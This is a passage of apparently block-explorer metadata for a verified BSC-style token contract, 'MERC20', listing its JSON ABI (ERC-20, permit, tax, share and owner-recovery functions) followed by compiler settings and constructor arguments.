ISwapRouterV2\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint24\",\"name\":\"value\",\"type\":\"uint24\"}],\"name\":\"_gas\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Address\",\"type\":\"address\"},{\"internalType\":\"uint16\",\"name\":\"value\",\"type\":\"uint16\"}],\"name\":\"_identifiers\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint48\",\"name\":\"value\",\"type\":\"uint48\"}],\"name\":\"_ratios\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes\",\"name\":\"value\",\"type\":\"bytes\"}],\"name\":\"_recipients\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint80\",\"name\":\"value\",\"type\":\"uint80\"}],\"name\":\"_shares\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"value\",\"type\":\"uint16\"}],\"name\":\"_swapThreshold\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"account\",\"outputs\":[{\"components\":[{\"internalType\":\"uint16\",\"name\":\"identifiers\",\"type\":\"uint16\"},{\"internalType\":\"uint64\",\"name\":\"nonces\",\"type\":\"uint64\"},{\"internalType\":\"uint80\",\"name\":\"PID\",\"type\":\"uint80\"},{\"internalType\":\"uint96\",\"name\":\"balance\",\"type\":\"uint96\"},{\"internalType\":\"address\",\"name\":\"Address\",\"type\":\"address\"}],\"internalType\":\"struct Account\",\"name\":\"\",\"type\":\"tuple\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"account\",\"outputs\":[{\"components\":[{\"internalType\":\"uint16\",\"name\":\"identifiers\",\"type\":\"uint16\"},{\"internalType\":\"uint64\",\"name\":\"nonces\",\"type\":\"uint64\"},{\"internalType\":\"uint80\",\"name\":\"PID\",\"type\":\"uint80\"},{\"internalType\":\"uint96\",\"name\":\"balance\",\"type\":\"uint96\"},{\"internalType\":\"address\",\"name\":\"Address\",\"type\":\"address\"}],\"internalType\":\"struct Account\",\"name\":\"\",\"type\":\"tuple\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"}],\"name\":\"connect\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"createPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"requestedDecrease\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"eip712Domain\",\"outputs\":[{\"internalType\":\"bytes1\",\"name\":\"fields\",\"type\":\"bytes1\"},{\"internalType\":\"string\",\"name\":\"name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"version\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"chainId\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"verifyingContract\",\"type\":\"address\"},{\"internalType\":\"bytes32\",\"name\":\"salt\",\"type\":\"bytes32\"},{\"internalType\":\"uint256[]\",\"name\":\"extensions\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Address\",\"type\":\"address\"}],\"name\":\"isMarketmaker\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"value\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"_token\",\"type\":\"address\"}],\"name\":\"recoverBEP20\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"recoverBNB\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setAsEntitled\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setAsMarketmaker\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shares\",\"outputs\":[{\"internalType\":\"uint16\",\"name\":\"\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"\",\"type\":\"uint16\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"value\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"taxes\",\"outputs\":[{\"internalType\":\"uint16\",\"name\":\"\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"\",\"type\":\"uint16\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "MERC20", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "10000", "ConstructorArguments": "000000000000000000000000a47c5eab5f4508730cdb68ce8e33e2178e6893e1", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://60a9b968f7edd691eb4b0f8e6c37439f4a95d332886e6dd84735467fa6daa330"}